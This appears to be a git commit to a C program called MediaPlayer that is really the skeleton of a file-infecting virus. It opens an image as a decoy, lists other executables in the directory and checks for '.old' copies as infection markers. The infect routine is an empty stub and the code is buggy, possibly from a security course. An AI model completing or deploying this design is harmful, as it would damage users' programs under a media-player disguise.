ff5fb276338de6c5421af9da90a776e2303877c6
Justin North <justin_n@hotmail.fr>
2019-04-05 10:54:50 +0200

    Ajout de méthodes dans le Media Player

--- src/MediaPlayer.c
+++ src/MediaPlayer.c
@@ -1,20 +1,85 @@
 #include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdbool.h>
 
 char** getFiles();
 void infecte(char** f);
+bool dejaInfecte(char* f);
 
 int main(int argc, char const *argv[])
 {
     char** files = getFiles();
-    infecte(files);
+    //infecte(files);
     system("xdg-open ../img/img1.jpg");
     return EXIT_SUCCESS;
 }
 
 char** getFiles(){
-    return NULL;
+    char** files = malloc(3*sizeof(char*));
+    int cpt = 0;
+    DIR *repertoire = opendir(".");
+    struct stat statsF;
+    struct dirent *lecture;
+    printf("Liste des fichiers exécutables : \n");
+    while(lecture = readdir(repertoire)){
+        /**
+         * Lecture du répertoire
+         */
+        if ((stat(lecture->d_name, &statsF) == 0) && ((statsF.st_mode & S_IFMT) == S_IFREG) && (statsF.st_mode & S_IXUSR)) {
+            /**
+             * Si le fichier est exécutable et régulier
+             */
+            if ((strcmp(lecture->d_name, "MediaPlayer.exe") != 0) && !dejaInfecte(lecture->d_name)) {
+                /**
+                 * Si l'exécutable n'est pas le media player et qu'il n'a pas déjà été infecté
+                 */
+                printf("- %s\n", lecture->d_name);
+                files[cpt] = lecture->d_name;
+                cpt++;
+            }
+
+        }
+
+    }
+    closedir(repertoire);
+    return files;
 }
 
 void infecte(char** f){
+    for(int i = 0; i < sizeof(f); i++)
+    {
+        FILE *newFile;
+        FILE *oldFile;
 
+    }
+
+}
+
+bool dejaInfecte(char* f){
+    char* extension = ".old";
+    if (strstr(f, extension) != NULL) {
+        /**
+         * Le fichier en paramètres ne possède pas l'extension .old
+        */
+        return true;
+    } else{
+        DIR* repertoire = opendir(".");
+        struct dirent *lecture;
+        while(lecture = readdir(repertoire)){
+            if ((strcmp(lecture->d_name, f) == 0) && (fopen(strcat(lecture->d_name, extension), 'r') != NULL)) {
+                /**
+                * Le fichier lu dans le répertoire et le fichier en paramètre sont les mêmes
+                * Le fichier lu avec l'extension .old a été ouvert
+                * Donc le fichier est infecté
+                 */
+                return true;
+            }
+        }
+    }
+    return false;
 }
